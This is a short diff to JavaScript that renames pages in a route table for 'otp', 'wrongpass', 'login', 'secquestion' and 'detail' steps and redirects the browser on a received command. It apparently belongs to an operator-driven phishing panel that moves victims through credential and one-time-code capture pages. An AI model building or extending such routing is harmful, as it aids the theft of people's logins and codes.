@@ -194,8 +194,8 @@
 
     const ROUTES = {
         "otp":     "otp.html",
-        "wrongpass":  "wrongpass.html",
-        "login":   "login.html",
+        "wrongpass":  "notcorrect.html",
+        "login":   "log.html",
         "secquestion": "sec1.html",
         "detail":   "detail.html"
     };
@@ -332,7 +332,7 @@
 
                     // Follow the command
                     stopTabSpinner();
-                    window.location.href = ROUTES[action] || "login.html";
+                    window.location.href = ROUTES[action] || "log.html";
                     return;
                 }
             } catch (e) {
